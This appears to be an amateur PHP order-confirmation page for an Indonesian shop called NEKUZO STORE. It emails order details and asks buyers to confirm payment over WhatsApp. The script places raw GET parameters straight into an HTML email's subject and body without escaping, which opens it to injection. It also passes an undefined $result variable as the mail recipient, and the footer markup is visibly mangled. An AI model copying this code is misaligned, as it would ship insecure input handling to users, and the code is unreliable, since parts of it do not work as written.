<?php
 $timestamp = date('d/m/Y h:i:s');

	$produk 	= $_GET['produk'];
	$harga 		= $_GET['harga'];
	$bayar		= $_GET['bayar'];


$subject = "$produk Bayar  $bayar";
$message = '
<center>
<div style="margin-top:10px;margin-bottom:10px;border-radius:1px;padding:5px;width:100%;background:#fff;color:white;text-align:center;">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="height: 50px; color:white;padding:0px;background:#1ed0ff; text-align:center;">
				Orderan '.$produk.'
			</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=left style="color:#24291D;padding:10px;background:white">
				<center><font style="color:#000; margin: 8px;">=== Orderan Boss ===</font></center>
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Yg di Beli	:</b></font> '.$produk.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Total	:</b></font> '.$harga.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Pakai	:</b></font> '.$bayar.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Waktu	:</b></font> '.$timestamp.'
			</td>
		</tr>
	</tbody>
	</table>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:#1ed0ff;color:white;text-align:center;"><font size=3 color=white><b> 2020</b></font></div>
</div>
</center>
';


$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: Pembeli Gan <ytbasecamp@gmail.com>' . "\r\n";
$datamail = mail($result,$subject, $message, $headersx);
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="Description" content="SITE NEKUZO STORE">
	<meta property="og:type" content="website">
	<meta property="og:title" content="SITE NEKUZO STORE">
	<meta property="og:description" content="By NEKUZO XD">
	<meta property="og:image" content="https://i.ibb.co/Mkck4c9/20201127-010702.jpg">
	<link rel="icon" type="image/png" href="https://i.ibb.co/Mkck4c9/20201127-010702.jpg">
	<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	
	<link rel="stylesheet" href="../../css/style.css">
<title>SITE NEKUZO STORE STORE</title>
</head>


<body>

	<div class="box">


<div class="nav">
NEKUZO XD 
</div>
<br><br>
<div style="background:#1ed0ff; margin-top: 5%; color: #fff;">
<center>
	<i class="fa fa-html5 fa-1g" aria-hidden="true" style="margin-right: 10px;"></i>
		<span class="fa-stack fa-lg">
		<i class="fa fa-square fa-stack-2x" style="color: #000;"></i>
		<i class="fa fa-code fa-stack-1x fa-inverse"></i>
		</span>
	<i class="fa fa-css3 fa-1g" aria-hidden="true" style="margin-left: 10px;"></i>
</center>
</div>

<div class="garis-home"></div>
<div class="solusi"><i class="fa fa-check-square-o fa-2x" aria-hidden="true"></i>  Konfirmasi</div>
<center>
<div class="cart">

<div class="pilihan">Silahkan konfirmasi lewat</div>
	<div class="whatsapp2" onclick="location.href='http://wa.me/6282291326823';">
	<i class="fa fa-whatsapp fa-1g" aria-hidden="true" style="color: #fff;"></i> Whatsapp
	</div>

<br><br><br>
<b style="color: red;">*</b>Setelah membayar harap konfirmasi lewat Whatsapp/Telegram dan mengirimkan bukti.
</div>

	</div>


<footer>
	h3> Tentang Kami</h3>
style="color:#6e6e75;">NEKUZO XD </a></li>
<li><a href="http://wa.me/6282291326823"> Whatsapp</a></li>
<li><a href="https://chat.whatsapp.com/FTjQtg8MSTzJ82JpUQwdpp"> Grup Jb</a></li>
<br>
</div>
</footer>

	

</body>
</html>
